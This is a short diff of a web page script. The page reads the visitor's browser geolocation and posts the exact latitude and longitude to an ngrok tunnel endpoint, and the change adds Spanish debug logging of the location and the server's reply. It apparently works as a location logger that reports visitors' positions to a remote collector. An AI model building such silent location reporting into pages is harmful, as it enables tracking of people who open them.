@@ -14,17 +14,23 @@
   navigator.geolocation.getCurrentPosition(function(position) {
     const lat = position.coords.latitude;
     const lon = position.coords.longitude;
-
+  
+    console.log("Ubicación detectada:", lat, lon);
+  
     fetch("https://ff58b0a2105a.ngrok-free.app:5000/log", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({ latitude: lat, longitude: lon })
-    });
+    })
+    .then(res => console.log("Respuesta del servidor:", res.status))
+    .catch(err => console.error("Error al enviar ubicación:", err));
   });
   </script>
 
+
 </body>
 </html>
+
 
 
 
